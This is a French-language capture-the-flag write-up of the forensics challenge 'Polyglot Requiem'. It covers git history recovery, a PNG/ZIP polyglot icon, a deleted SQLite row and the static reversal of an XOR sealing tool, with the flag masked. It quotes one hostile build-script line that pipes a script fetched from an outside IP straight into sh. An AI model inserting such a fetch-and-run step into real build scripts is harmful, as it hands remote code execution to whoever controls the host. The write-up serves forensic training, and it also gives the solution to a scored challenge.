---
tags: [forensics, git, polyglot, sqlite, reverse]
---

[🇬🇧 English](README.md) · 🇫🇷 Français

# Polyglot Requiem

| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
|---|---|---|---|---|---|---|
| forensics | 108 | ✅ | — | non | 0xAr3s-root | Mohamed Amine Mzoughi |

## Énoncé

> A review of a ground-station software supply chain turned up altered build history and an odd dashboard asset. The station works for the Operation Dawn coalition, which puts its builds high on the Ash Army's target list.
>
> Recover the concealed marker from the retained repository and submit the complete `CSCTF{...}` value. Inspect build scripts, hooks and recovered programs as data: do not run them, and do not contact addresses found in the evidence. The exercise is constructed and the organizations are fictional. Attachment: `polyglot-requiem.zip`, 39,051 bytes, SHA-256 `2a3aeda4fcc7fab03a268130a22b31b2194ed45f74981146ae765d78c97813c9`.
>
> Flag format: `CSCTF{...}`

**Fichiers fournis :** `files/flight-telemetry-sdk/` (un dépôt git avec son `.git`), `files/README_FOR_RESPONDERS.md`, `files/manifest.sha256` (non commités).

## En bref

`assets/telemetry_icon.png` est un polyglotte PNG/ZIP : un chunk `tEXt` porte un tag de provenance, et le ZIP ajouté contient un fichier SQLite avec une ligne `ci_provenance_seal` *supprimée* et l'outil de scellement `assetsignd` ; l'analyse statique de cet outil donne le schéma (XOR à clé répétée avec `SHA-256(inverse(tag) ‖ epoch_le64)`) et le timestamp des commits est l'epoch → flag.

## Démarche

**1. Reconnaissance — un dépôt avec un commit orphelin et une icône suspecte**

J'ai travaillé sur une copie du dépôt et n'ai jamais lancé `build.sh` ni un hook. `git log --all` montre cinq commits ordinaires, tous au même timestamp (1792061626). `git fsck --lost-found --unreachable` trouve un commit inatteignable, `c435f88` « build: add telemetry opt-in check » (il est aussi dans `.git/ORIG_HEAD`) : son `build.sh` fait `curl -s http://198.51.100.9/telemetry-opt-in.sh | sh` — « l'historique de build altéré » qui a été écarté par un reset. Je n'ai pas contacté l'adresse ; c'est une diversion par rapport au marqueur.

L'autre piste est l'icône ajoutée dans `92d3ba9` et référencée dans le README : `assets/telemetry_icon.png` fait 23 008 octets pour une image 10×10. `binwalk` signale un PNG, puis un ZIP à 0x72.

**2. Hypothèse — un polyglotte PNG/ZIP avec un secret supprimé**

En parcourant les chunks PNG à la main : `IHDR`, un chunk `tEXt` `Provenance` = `0f18e37122ddbcca` (8 octets en hexa, le « tag »), un minuscule `IDAT`, `IEND` ; puis 22 894 octets en trop qui commencent par `PK\x03\x04`. Extrait (stocké, sans compression), le ZIP a deux membres :

- `telemetry_cache.db` : SQLite, table `build_secrets` avec des jetons manifestement faux (`AKIADEMOFAKE…`, `npm_fake…`) — leurres ;
- `assetsignd` : un ELF dont l'usage est `assetsignd <provenance_tag_hex> <epoch> <infile> <outfile>`.

`strings` sur la base montre une ligne que `.dump` n'affiche pas : `ci_provenance_seal` suivie de 36 octets à forte entropie. Elle a été supprimée (la cellule est encore dans le corps de la page, espace non alloué) donc SQLite ne la renvoie pas. L'en-tête de l'enregistrement avant le libellé donne la longueur du blob (type sériel `0x54` → 36 octets). Un chiffré, un tag, une epoch et un outil qui prend exactement ces entrées : l'outil scelle la donnée.

**3. Exploitation — inverser le scellement statiquement, puis recalculer la clé**

Je n'ai pas exécuté `assetsignd`. Son désassemblage (`objdump`/`r2`) montre : les constantes SHA-256 en ligne (aucun import libcrypto), `strtoull(argv[2])` pour l'epoch, `sscanf("%02x")` pour parser le tag en octets, **une inversion des octets du tag**, l'epoch ajoutée en **8 octets little-endian**, un SHA-256 sur ce message, et enfin `out[i] = in[i] ^ digest[i & 0x1f]`. Donc :

```text
key = SHA-256( inverse(tag_bytes) || epoch_le64 );  clair[i] = chiffré[i] XOR key[i mod 32]
```

Pour l'epoch, le candidat évident est le timestamp du dépôt, 1792061626 (l'en-tête daté, l'index git et les entrées du ZIP concordent). J'ai d'abord essayé la variante `HMAC-SHA256` d'un outil similaire d'un autre challenge, sans résultat ; j'ai ensuite brute-forcé l'epoch autour de l'heure des commits contre le préfixe connu `CSCTF{` (6 octets de clé), ce qui a confirmé tout de suite le schéma SHA-256 à tag inversé pour exactement 1792061626. Déchiffrer les 36 octets donne le flag.

```bash
python3 -I solve/solve.py files/flight-telemetry-sdk
```

Script de résolution : [`solve/solve.py`](solve/solve.py)

## Flag

`CSCTF{...}` (masqué)

## Réflexions

- Les sorties d'outils cachent les données supprimées : `.dump` et les requêtes SQLite ignorent les cellules supprimées, `strings`/hexa brut sur le fichier non.
- Une image peut porter une archive entière après `IEND` ; parcourir les chunks et regarder les octets en trop est plus rapide que se fier à l'extension.
- Un binaire documenté seulement par sa ligne d'usage se comprend statiquement : les constantes (table K de SHA-256), les boucles (inversion d'octets, epoch sur 8 octets) et le XOR final ont suffi, sans l'exécuter.
- Le préfixe en clair connu `CSCTF{` transforme un paramètre incertain (l'epoch) en brute force bon marché et valide tout le schéma.
- Le commit orphelin avec `curl | sh` est l'« histoire » du scénario, pas le marqueur : le noter sans toucher à l'adresse est la bonne manipulation.

## Outils & références

- `git` (`log --all`, `fsck --lost-found`, `cat-file`), `binwalk`, `strings`, `objdump`, `radare2`
- Python 3 (`struct`, `zipfile`, `hashlib`)
- Structure des chunks PNG, données ajoutées à un ZIP, format d'enregistrement SQLite (types sériels)

---
[⬅ Retour à l'événement](../../README.fr.md)
